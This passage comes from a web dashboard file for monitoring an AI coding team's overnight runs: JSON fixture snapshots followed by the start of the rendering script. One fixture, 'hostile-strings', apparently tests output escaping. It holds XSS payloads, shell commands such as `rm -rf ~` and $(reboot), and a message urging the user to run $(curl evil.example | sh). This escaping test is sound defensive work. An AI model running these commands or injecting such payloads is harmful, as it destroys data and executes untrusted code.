ran and found no serious problem.","caveat":"It covered only the 2 features that were built."},{"id":"nothing_open","label":"Nothing open","state":"no","why":"1 item is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":20,"tellLeader":"About \"Members site\": \u003cyour answer here>"},{"missionId":"2026-10-11-recipe-box","title":"Recipe box","verdict":{"id":"needs_you","word":"Needs you","sentence":"It needs your help."},"plannedLine":"2 features planned","got":[],"leftOut":[],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"no","why":"0 of 2 features were built and checked.","caveat":null},{"id":"final_review","label":"Final review passed","state":"no","why":"The final check did not run.","caveat":null},{"id":"nothing_open","label":"Nothing open","state":"no","why":"1 item is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":7,"tellLeader":"About \"Recipe box\": \u003cyour answer here>"},{"missionId":"2026-10-11-task-board","title":"Task board","verdict":{"id":"done","word":"Done","sentence":"All 3 features are built and checked."},"plannedLine":"3 features planned","got":[{"featureId":"list-tasks","title":"Task list","note":{"text":"As a user I see my tasks.","author":"ai"},"attempts":1},{"featureId":"add-task","title":"Add a task","note":{"text":"As a user I can add a task.","author":"ai"},"attempts":1},{"featureId":"done-task","title":"Mark a task done","note":{"text":"As a user I can complete a task.","author":"ai"},"attempts":1}],"leftOut":[],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"yes","why":"All 3 features were built and checked.","caveat":null},{"id":"final_review","label":"Final review passed","state":"yes","why":"The final review ran and found no serious problem.","caveat":null},{"id":"nothing_open","label":"Nothing open","state":"yes","why":"Nothing is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":17,"tellLeader":"About \"Task board\": \u003cyour answer here>"},{"missionId":"2026-10-11-reader","title":"Reader","verdict":{"id":"done","word":"Done","sentence":"All 2 features are built and checked."},"plannedLine":"2 features planned","got":[{"featureId":"feed","title":"News feed","note":{"text":"As a reader I see articles.","author":"ai"},"attempts":1},{"featureId":"bookmark","title":"Bookmarks","note":{"text":"As a reader I can save an article.","author":"ai"},"attempts":1}],"leftOut":[],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"yes","why":"All 2 features were built and checked.","caveat":null},{"id":"final_review","label":"Final review passed","state":"yes","why":"The final review ran and found no serious problem.","caveat":null},{"id":"nothing_open","label":"Nothing open","state":"yes","why":"Nothing is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":14,"tellLeader":"About \"Reader\": \u003cyour answer here>"}],"allowanceNote":"The AI work runs on your existing Claude and Codex plans, so there is no separate bill. This page cannot show your share of the week yet.","honestyNote":"These are the AI team's own checks, not a human review."},"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":5,"featuresDone":11,"featuresTotal":15,"featuresLine":"11 of 15 features done","questions":0,"stuckFeatures":1,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"allowance-readings":{"schemaVersion":1,"generatedAt":1791712710000,"generatedAtText":"09:58:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"on_track","word":"On track","sentence":"1 of 3 features done. No problems so far. Nothing needs you.","reasons":[{"code":"working","severity":"ok","text":"the run is working and nothing needs a look","missionId":null,"featureId":null}]},"run":{"active":true,"heartbeat":"fresh","startedAt":1791712699844,"startedAtText":"09:58","runningMs":10156,"runningText":"10 s","heartbeatAgeMs":15000,"heartbeatText":"15 s ago","stopRequested":false,"lastActivityAt":1791712701068,"lastActivityText":"8 s ago","deadline":null,"line":"Task board (new app), running 10 s","activityLine":"Last activity 8 s ago"},"now":{"kind":"agent","text":"An AI is writing the checks for “Add a task”","missionId":"2026-10-11-task-board","featureId":"add-task","since":1791712701068,"sinceText":"8 s so far","exact":true},"missions":[{"id":"2026-10-11-task-board","title":"Task board","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"working","word":"Working","sentence":"Building feature 2 of 3.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"current"},{"id":"final_check","word":"Final check","state":"todo"},{"id":"landed","word":"Landed","state":"todo"}],"progressWord":"Build","repairLap":false,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","waiting":null,"features":[{"id":"list-tasks","title":"Task list","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Task list\" in Task board: \u003cyour answer here>"},{"id":"add-task","title":"Add a task","state":"being_built","word":"Being built","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Add a task\" in Task board: \u003cyour answer here>"},{"id":"done-task","title":"Mark a task done","state":"waiting_turn","word":"Waiting its turn","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Mark a task done\" in Task board: \u003cyour answer here>"}],"updatedAt":1791712701056,"tellLeader":"About \"Task board\": \u003cyour answer here>"}],"needsYou":[],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"plenty","word":"Plenty"},"windows":[{"id":"five_hour","label":"Next 5 hours","usedFraction":0.62,"usedPercent":62,"fill":0.62,"overage":false,"resetsAt":1791721200000,"resetsText":"resets 12:20","pauseAt":0.97,"text":"62% used, resets 12:20"},{"id":"seven_day","label":"This week","usedFraction":0.41,"usedPercent":41,"fill":0.41,"overage":false,"resetsAt":1792054800000,"resetsText":"resets Thu 09:00","pauseAt":0.85,"text":"41% used, resets Thu 09:00"}],"note":null,"limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"plenty","word":"Plenty"},"windows":[{"id":"seven_day","label":"This week","usedFraction":0.18,"usedPercent":18,"fill":0.18,"overage":false,"resetsAt":1792002600000,"resetsText":"resets Wed 18:30","pauseAt":0.85,"text":"18% used, resets Wed 18:30"}],"note":"No 5-hour limit reported.","limitedUntil":null,"limitedText":null}],"waiting":null,"fileChangedAt":1791712680000,"fileChangedText":"Usage figures last changed at 09:58"},"timeline":{"items":[{"at":1791712699847,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"info","text":"Started working on “Task board”.","note":null,"author":"engine","count":1},{"at":1791712699853,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"info","text":"The plan is ready: 3 features.","note":null,"author":"engine","count":1},{"at":1791712700124,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712700991,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":"list-tasks","tone":"good","text":"“Task list” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712701056,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":"add-task","tone":"info","text":"Started on “Add a task”.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":null,"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","questions":0,"stuckFeatures":0,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"idle":{"schemaVersion":1,"generatedAt":1791713010000,"generatedAtText":"10:03:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"idle","word":"Idle","sentence":"Nothing is running and nothing is queued.","reasons":[{"code":"nothing_tonight","severity":"ok","text":"nothing is running","missionId":null,"featureId":null}]},"run":{"active":false,"heartbeat":"none","startedAt":null,"startedAtText":null,"runningMs":null,"runningText":null,"heartbeatAgeMs":null,"heartbeatText":null,"stopRequested":false,"lastActivityAt":null,"lastActivityText":null,"deadline":null,"line":"No run is working right now.","activityLine":null},"now":null,"missions":[],"needsYou":[],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null}],"waiting":null,"fileChangedAt":null,"fileChangedText":null},"timeline":{"items":[],"earlierNotShown":0},"debrief":null,"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":0,"featuresDone":0,"featuresTotal":0,"featuresLine":"No features planned yet","questions":0,"stuckFeatures":0,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"hostile-strings":{"schemaVersion":1,"generatedAt":1791712710000,"generatedAtText":"09:58:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"needs_look","word":"Needs a look","sentence":"1 feature is stuck and 2 questions are waiting for you.","reasons":[{"code":"feature_stuck","severity":"look","text":"1 feature is stuck","missionId":null,"featureId":null},{"code":"decision_waiting","severity":"look","text":"2 questions are waiting for you","missionId":null,"featureId":null}]},"run":{"active":false,"heartbeat":"none","startedAt":null,"startedAtText":null,"runningMs":null,"runningText":null,"heartbeatAgeMs":null,"heartbeatText":null,"stopRequested":false,"lastActivityAt":null,"lastActivityText":null,"deadline":null,"line":"No run is working right now.","activityLine":null},"now":null,"missions":[{"id":"2026-10-11-hostile","title":"\u003cscript>alert(1)\u003c/script> \">\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"partly_done","word":"Partly done","sentence":"1 of 3 features are built and checked. 1 feature is stuck. 1 feature was left out.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"done"},{"id":"final_check","word":"Final check","state":"done"},{"id":"landed","word":"Landed","state":"done"}],"progressWord":"Landed","repairLap":false,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","waiting":null,"features":[{"id":"good","title":"A fine feature","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"A fine feature\" in \u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…: \u003cyour answer here>"},{"id":"evil","title":"\u003cb>bold\u003c/b> reversedzero width long long long long long long long long long long long long long long long long long lon…","state":"stuck","word":"Stuck","reason":{"text":"Run `mc run --mission 2026-10-11-hostile` and \u003cimg src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…","author":"ai"},"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":"feature_stuck:2026-10-11-hostile:evil","tellLeader":"About \"\u003cb>bold\u003c/b> reversedzero width long long long long long long long long long long long long long long long long long lon…\" in \u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…: \u003cyour answer here>"},{"id":"skipped-one","title":"Needs the evil one","state":"left_out","word":"Left out","reason":{"text":"It needed “\u003cb>bold\u003c/b> reversed”, which is stuck.","author":"engine"},"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Needs the evil one\" in \u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…: \u003cyour answer here>"}],"updatedAt":1791712700000,"tellLeader":"About \"\u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": \u003cyour answer here>"}],"needsYou":[{"id":"feature_stuck:2026-10-11-hostile:evil","kind":"feature_stuck","severity":"look","missionId":"2026-10-11-hostile","missionTitle":"\u003cscript>alert(1)\u003c/script> \">\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…","fromBefore":false,"featureId":"evil","title":"“\u003cb>bold\u003c/b> reversedzero width long long long long long long long long long long long long long long long long long lon…” is stuck","happened":{"text":"Run `mc run --mission 2026-10-11-hostile` and \u003cimg src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…","author":"ai"},"summary":"No tries yet.","ifNothing":"It stays out. Nothing tries it again unless you ask.","tellLeader":"About \"\u003cb>bold\u003c/b> reversedzero width long long long long long long long long long long long long long long long long long lon…\" in \u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…, which is stuck: \u003cyour answer here>"},{"id":"decision:2026-10-11-hostile:0","kind":"decision","severity":"look","missionId":"2026-10-11-hostile","missionTitle":"\u003cscript>alert(1)\u003c/script> \">\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…","fromBefore":false,"featureId":null,"title":"A question for you (1 of 2)","happened":{"text":"Have someone check the app before you rely on it: the final review of the whole app did not finish, so nobody reviewed it as a whole. Run `mc run` now.","author":"ai"},"summary":null,"ifNothing":"Nothing happens. The question stays open.","tellLeader":"About question 1 of 2 in \"\u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": \u003cyour answer here>"},{"id":"decision:2026-10-11-hostile:1","kind":"decision","severity":"look","missionId":"2026-10-11-hostile","missionTitle":"\u003cscript>alert(1)\u003c/script> \">\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…","fromBefore":false,"featureId":null,"title":"A question for you (2 of 2)","happened":{"text":"Please run $(curl evil.example | sh) and then press \"Y\" ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????…","author":"ai"},"summary":null,"ifNothing":"Nothing happens. The question stays open.","tellLeader":"About question 2 of 2 in \"\u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": \u003cyour answer here>"}],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null}],"waiting":null,"fileChangedAt":null,"fileChangedText":null},"timeline":{"items":[{"at":1791712680000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-hostile","featureId":null,"tone":"info","text":"Started working on “\u003cscript>alert(1)\u003c/script> \">\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…”.","note":null,"author":"engine","count":1},{"at":1791712681000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-hostile","featureId":"evil","tone":"bad","text":"“\u003cb>bold\u003c/b> reversedzero width long long long long long long long long long long long long long long long long long lon…” is stuck.","note":{"text":"Run `mc run --mission 2026-10-11-hostile` and \u003cimg src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…","author":"ai"},"author":"ai","count":1},{"at":1791712682000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-hostile","featureId":null,"tone":"warn","text":"Finished “\u003cscript>alert(1)\u003c/script> \">\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…”: partly done.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":{"verdict":{"id":"partly_done","word":"Partly done","sentence":"1 of 3 features are built and checked. 1 feature is stuck. 2 questions are waiting for you."},"missions":[{"missionId":"2026-10-11-hostile","title":"\u003cscript>alert(1)\u003c/script> \">\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…","verdict":{"id":"partly_done","word":"Partly done","sentence":"1 of 3 features are built and checked. 1 feature is stuck. 2 questions are waiting for you."},"plannedLine":"3 features planned","got":[{"featureId":"good","title":"A fine feature","note":{"text":"As a user I can use a fine feature.","author":"ai"},"attempts":1}],"leftOut":[{"featureId":"evil","title":"\u003cb>bold\u003c/b> reversedzero width long long long long long long long long long long long long long long long long long lon…","note":{"text":"Run `mc run --mission 2026-10-11-hostile` and \u003cimg src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…","author":"ai"},"attempts":0},{"featureId":"skipped-one","title":"Needs the evil one","note":{"text":"It needed “\u003cb>bold\u003c/b> reversed”, which is stuck.","author":"engine"},"attempts":0}],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"no","why":"1 of 3 features were built and checked. 1 is stuck. 1 was left out.","caveat":null},{"id":"final_review","label":"Final review passed","state":"yes","why":"The final review ran and found no serious problem.","caveat":"It covered only the 1 feature that was built."},{"id":"nothing_open","label":"Nothing open","state":"no","why":"3 items are waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":null,"agentRuns":null,"tellLeader":"About \"\u003cscript>alert(1)\u003c/script> '>\u003cimg src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": \u003cyour answer here>"}],"allowanceNote":"The AI work runs on your existing Claude and Codex plans, so there is no separate bill. This page cannot show your share of the week yet.","honestyNote":"These are the AI team's own checks, not a human review."},"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","questions":2,"stuckFeatures":1,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}}}</script>
+<script>
+(function () {
+  "use strict";
+
+  // ---------------------------------------------------------------------------------------------
+  // Settings that only the page can know. The snapshot's freshness block replaces them once it arrives.
+  // ---------------------------------------------------------------------------------------------
+  var SCHEMA = 1;
+  var POLL_DEFAULT_MS = 4000;
+  var STALE_DEFAULT_MS = 30000;
+  var GONE_DEFAULT_MS = 300000;
+  var FETCH_TIMEOUT_MS = 10000;
+  var PLACEHOLDER = "<your answer here>";
+
+  // The words this page writes itself (docs/dashboard-spec.md 17.1). Everything else is a string from the snapshot.
+  var W = {
+    needsTop: "These are the things the AI team could not settle alone.",
+    happened: "What happened",
+    ifNothing: "If you do nothing",
+    tell: "Tell the leader",
+    openQuestion: "Open the question",
+    reinforcementsLabel: "Reinforcements called in: ",
+    none: "none",
+    stepsUsed: " steps used)",
+    recovered: "Recovered after a retry",
+    repairFeature: "Repair feature",
+    repairRound: "repair round",
+    checkOne: "1 check written for this feature",
+    checkMany: " checks written for this feature",
+    checkNone: "No checks written for this feature",
+    allowance: "Allowance (usage left in your plans)",
+    pauseHere: "work pauses here",
+    openBefore: "Open from before (",
+    updated: "Updated ",
+    earlier: "Earlier events are not shown (",
+    gotHeading: "What you got",
+    notFinished: "Not finished",
+    nightResult: "Night result",
+    allowanceNow: "Allowance now",
+    yes: "Yes",
+    no: "Not this time",
+    unknown: "Could not tell",
+    copied: "Copied. Paste it into your chat with the leader.",
+    emptyMissions: "No missions yet. When one is queued it appears here.",
+    emptyCards: "Nothing needs you right now.",
+    emptyTimeline: "Nothing has happened tonight yet.",
+    emptyDebrief: "The morning debrief appears when tonight's work has finished or paused.",
+    badVersion: "This page and Mission Control are different versions. Reload the page.",
+    cannotReach: "Cannot reach Mission Control."
+  };
+
+  // ---------------------------------------------------------------------------------------------
+  // State ids to icon and colour. An id this page does not know is shown as amber, never as green.
+  // ---------------------------------------------------------------------------------------------
+  var UNKNOWN_LOOK = { tone: "warn", icon: "tri" };
+  var LAMP_LOOK = {
+    on_track: { tone: "ok", icon: "check" },
+    needs_look: { tone: "warn", icon: "tri" },
+    needs_you_now: { tone: "bad", icon: "sq" },
+    idle: { tone: "idle", icon: "dash" },
+    not_responding: { tone: "lost", icon: "broken" }
+  };
+  var MISSION_LOOK = {
+    not_started: { tone: "idle", icon: "hollow" },
+    working: { tone: "info", icon: "ring" },
+    waiting: { tone: "info", icon: "clock" },
+    paused: { tone: "warn", icon: "pause" },
+    done: { tone: "ok", icon: "check" },
+    partly_done: { tone: "warn", icon: "half" },
+    needs_you: { tone: "bad", icon: "sq" },
+    unknown: { tone: "warn", icon: "tri" }
+  };
+  var FEATURE_LOOK = {
+    waiting_turn: { tone: "idle", icon: "hollow" },
+    being_built: { tone: "info", icon: "ring" },
+    being_reviewed: { tone: "info", icon: "half" },
+    done: { tone: "ok", icon: "check" },
+    stuck: { tone: "warn", icon: "tri" },
+    left_out: { tone: "idle", icon: "dash" },
+    paused: { tone: "warn", icon: "pause" },
+    unknown: { tone: "warn", icon: "tri" }
+  };
+  var PILL_LOOK = {
+    plenty: { tone: "ok", icon: "dot" },
+    getting_low: { tone: "warn", icon: "tri" },
+    nearly_out: { tone: "bad", icon: "sq" },
+    waiting_reset: { tone: "info", icon: "clock" },
+    no_reading: { tone: "idle", icon: "hollow" }
+  };
+  var TONE_LOOK = {
+    good: { tone: "ok", icon: "check" },
+    info: { tone: "info", icon: "info" },
+    warn: { tone: "warn", icon: "tri" },
+    bad: { tone: "bad", icon: "sq" }
+  };
+  var CARD_ICON = {
+    mission_failed: "sq",
+    feature_stuck: "tri",
+    decision: "q",
+    checks_failing: "tri",
+    run_stopped: "sq",
+    paused_disk: "pause",
+    paused_ai_failing: "pause",
+    login_needed: "lock"
+  };
+  var TICK_LOOK = {
+    yes: { tone: "ok", icon: "box-yes", word: W.yes },
+    no: { tone: "warn", icon: "box-no", word: W.no },
+    unknown: { tone: "idle", icon: "box-unk", word: W.unknown }
+  };
+  var VERDICT_LOOK = {
+    done: { tone: "ok", icon: "check" },
+    partly_done: { tone: "warn", icon: "half" },
+    needs_you: { tone: "bad", icon: "sq" },
+    paused: { tone: "warn", icon: "pause" }
+  };
+  // The five steps of a mission, in order. The checks only advise, so none of them is drawn as a hold.
+  var STEP_LOOK = {
+    done: "check",
+    current: "ring",
+    todo: "hollow"
+  };
+  var STEP_IDS = ["plan", "plan_check", "build", "final_check", "landed"];
+  var TABS = ["tonight", "needs", "timeline", "debrief"];
+
+  function look(table, id) {
+    return Object.prototype.hasOwnProperty.call(table, id) ? table[id] : UNKNOWN_LOOK;
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Small DOM helpers. Every string goes in with textContent or a text node: never as markup.
+  // ---------------------------------------------------------------------------------------------
+  var SVG_NS = document.getElementById("sprite").namespaceURI;
+  var uid = 0;
+
+  function $(id) { return document.getElementById(id); }
+  function clear(node) { while (node.firstChild) node.removeChild(node.firstChild); }
+  function el(tag, cls, text) {
+    var node = document.createElement(tag);
+    if (cls) node.className = cls;
+    if (text !== undefined && text !== null) node.textContent = text;
+    return node;
+  }
+  function add(parent) {
+    for (var i = 1; i < arguments.length; i++) {
+      var kid = arguments[i];
+      if (kid === null || kid === undefined || kid === false) continue;
+      parent.appendChild(typeof kid === "string" ? document.createTextNode(kid) : kid);
+    }
